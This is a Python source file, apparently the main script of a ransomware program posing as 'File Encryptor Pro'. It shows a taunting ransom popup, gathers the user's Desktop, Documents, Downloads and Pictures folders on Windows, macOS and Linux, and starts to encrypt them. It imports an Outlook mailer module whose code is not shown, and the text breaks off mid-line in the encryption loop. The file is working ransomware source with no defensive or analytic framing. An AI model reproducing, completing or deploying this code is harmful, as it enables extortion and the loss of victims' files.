import os
import sys
import platform
import time
import tkinter as tk
from tkinter import messagebox
from encryptor import FileEncryptor
from mailer import OutlookMailer

def show_ransom_popup():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    
    # Create the ransom message
    title = "YOUR FILES HAVE BEEN ENCRYPTED!"
    message = """
All your important files have been encrypted with military-grade AES-256 encryption.
Your documents, photos, videos, and other files are now inaccessible.

To decrypt your files, you need a special decryption key.
Without this key, your files will remain encrypted forever.

This looks like a skill issue on your part - maybe next time you'll have proper backups.

Check your desktop for further instructions.
"""
    
    # Show the popup
    messagebox.showerror(title, message)
    
    # Show it again after a delay to make sure they see it
    root.after(5000, lambda: messagebox.showerror(title, message))
    root.mainloop()

def get_user_directories():
    if platform.system() == "Windows":
        desktop_path = os.path.join(os.environ.get('USERPROFILE'), 'Desktop')
        documents_path = os.path.join(os.environ.get('USERPROFILE'), 'Documents')
        downloads_path = os.path.join(os.environ.get('USERPROFILE'), 'Downloads')
        pictures_path = os.path.join(os.environ.get('USERPROFILE'), 'Pictures')
    elif platform.system() == "Darwin":  # macOS
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        pictures_path = os.path.join(os.path.expanduser('~'), 'Pictures')
    else:  # Linux
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        pictures_path = os.path.join(os.path.expanduser('~'), 'Pictures')
    
    return [desktop_path, documents_path, downloads_path, pictures_path]

def main():
    print("Initializing File Encryptor Pro...")
    time.sleep(2)  # Simulate loading
    
    # Create encryptor
    encryptor = FileEncryptor()
    
    # Get user directories
    user_dirs = get_user_directories()
    
    # Encrypt files in user directories
    print("Encrypting files...")
    for directory in user_dirs:
        if os.path.exists(directory):
            encryptor.encrypt_directory
